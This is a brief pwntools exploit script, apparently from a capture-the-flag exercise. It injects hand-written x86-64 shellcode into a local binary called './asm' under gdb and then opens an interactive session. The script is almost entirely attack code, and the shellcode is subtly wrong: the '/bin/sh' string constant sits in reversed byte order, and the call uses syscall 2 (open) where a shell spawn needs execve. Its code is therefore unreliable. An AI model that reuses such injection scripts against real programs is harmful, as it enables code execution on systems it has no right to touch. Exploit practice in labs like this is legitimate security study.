from pwn import *

shellcode = '''
push 0
mov rax, 0x2f62696e2f73682f
push rax

mov rdi, rsp
mov rsi, 0
mov rdx, 0
mov rax, 2
syscall
'''

context.terminal = ['tmux', 'splitw', '-h']

sh = asm(shellcode, bits=64, arch='amd64')

gdbscript='''
set follow-fork-mode child
b *main
'''

p = gdb.debug('./asm',gdbscript)
p.readuntil(b'shellcode: ')

p.sendline(sh)

p.interactive()
